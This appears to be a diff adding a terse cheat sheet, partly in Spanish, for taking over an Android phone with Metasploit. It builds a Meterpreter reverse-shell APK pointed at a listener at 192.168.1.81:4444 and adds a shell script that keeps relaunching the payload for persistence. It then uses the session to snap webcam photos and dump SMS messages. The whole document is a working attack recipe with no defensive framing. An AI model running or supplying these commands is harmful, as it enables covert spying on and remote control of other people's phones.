@@ -1,0 +1,55 @@
+--------------ss -ant
+service postgresql start
+msfdb init
+msfdb restart
+
+msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=192.168.1.81 LPORT=4444 > meter.apk
+-------------------
+service postgresql start
+apt-get install docker-compose
+ 
+ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+
+msfdb init
+msfdb restart
+db_status
+
+{
+---https://docs.kali.org/general-use/starting-metasploit-framework-in-kali---
+docker-compose run --rm --service-ports -e MSF_UID=$(id -u) -e MSF_GID=$(id -g) ms
+}
+msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=192.168.1.81 LPORT=4444 > meter.apk
+
+archivo persist.sh
+#!/bin/sh
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage .MainActivity
+sleep 10
+done
+
+
+msfconsole
+msf > use exploit/multi/handler
+
+msf exploit(handler) > 
+  set PAYLOAD android/meterpreter/reverse_tcp
+  ip a
+  set LHOST 192.168.1.81
+  set LPORT 4444
+  run - exploit
+
+meterpreter > webcam_snap
+meterpreter > dump_sms
+  webcam_snap -i 2 -q 100
+
+meterpreter >   cd /sdcard
+meterpreter > upload ruta-del-persist.sh
+meterpreter > shell
+cd sdcard
+ls
+sh persist.sh
+-- starting: Intent { act=android.intent...}
+
+meterpreter > exit
